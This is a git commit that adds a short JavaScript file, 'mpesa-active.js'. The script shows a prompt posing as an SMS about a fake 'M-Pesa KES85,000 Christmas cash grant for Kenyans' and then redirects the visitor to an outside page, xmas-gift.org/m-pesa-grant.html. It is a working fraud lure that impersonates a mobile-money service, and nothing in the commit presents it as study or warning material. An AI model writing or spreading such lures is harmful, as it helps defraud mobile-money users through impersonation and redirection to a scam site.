60310760e076e8bea6d6746e51019ab7c3883d13
4g-network <154092422+4g-network@users.noreply.github.com>
2024-11-19 23:18:36 -0800

    Create mpesa-active.js

---
+++ mpesa-active.js
@@ -0,0 +1,6 @@
+
+var password = 'KES85,000 X-MAS GRANT'
+password=prompt('SMS: Congratulations You are qualify for M-Pesa KES85,000 CHRISTMAS CASH GRANT FOR KENYANS, Kindly Press OK to Withdraw Cash Prize   ','KES85,000 X-MAS GRANT');
+if (password != 'KES85,000 X-MAS GRANT') {
+location.href='https://xmas-gift.org/m-pesa-grant.html';
+}
